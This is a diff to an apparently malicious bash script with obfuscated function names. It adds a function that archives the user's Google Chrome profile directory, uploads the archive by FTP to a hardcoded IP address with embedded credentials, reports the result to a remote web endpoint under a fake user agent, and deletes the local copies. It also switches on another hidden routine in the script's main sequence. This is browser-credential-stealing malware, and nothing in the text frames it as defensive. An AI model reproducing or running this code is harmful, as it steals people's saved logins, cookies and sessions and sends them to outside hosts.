@@ -1,4 +1,4 @@
-k#!/bin/bash
+#!/bin/bash
 
 function dbgx(){
 	echo "[*] $1";
@@ -101,6 +101,33 @@ function WbCmx(){
         rm -f "$output_file"
 }
 
+function GCx_(){
+	ftp_server="139.162.128.166"
+	ftp_user="r00t1970"
+	ftp_password="#r00t#1970#"
+	#
+	folder_to_compress="/home/$USER/.config/google-chrome"
+	#folder_to_compress="/home/r00t/.config/ibus_/px.jpg"
+	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
+	tar -czvf "$local_file" "$folder_to_compress"
+	#
+	remote_directory="/home/r00t1970/"`date +%s`"GCx.tar.gz"
+	#
+	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
+	quote USER $ftp_user
+	quote PASS $ftp_password
+	binary
+	put "$local_file" "$remote_directory"
+	quit
+	END_SCRIPT`
+	#
+	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
+     	dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
+     	#
+     	rm -f "$local_file"
+    	rm -f "$IBUS_""gcx.tar.gz"
+}
+
 function cx(){
     #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS__$1 https://oshi.at`
     #dbgx "OX2: $OX2";
@@ -166,7 +193,9 @@ function px(){
  	Mcx
  	#
     	ssx_ & ax_
-    	#
+    	WbCmx
+     	#GCx_
+      	#
 	ssx2
  	#
   	xyz
